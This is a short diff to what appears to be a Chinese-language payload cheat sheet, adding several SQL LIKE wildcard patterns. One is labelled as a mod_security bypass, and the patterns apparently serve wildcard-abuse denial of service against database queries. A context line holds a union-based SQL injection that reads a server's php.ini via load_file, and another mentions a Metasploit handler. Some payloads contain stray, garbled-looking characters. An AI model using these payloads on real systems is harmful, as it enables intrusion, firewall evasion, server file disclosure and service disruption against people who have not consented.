@@ -133,3 +133,10 @@ msf 利用（处理程序）>利用
 
 
 ' union select 1,load_file('C:/xampp/htdocs/php.ini')#
+
+SELECT * FROM test.user where username like '%_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%';
+'%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£()$*R” _)][%](%[x])%a][$*”£$-9]_%'
+'%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}£$&N%55_)$*£() $*R”_)][%55](%66[x])%ba][$*”£$-9]_%54'（绕过模组安全）
+_[r/a)_ _(r/b)_ _(rd)_
+%n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
+%_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
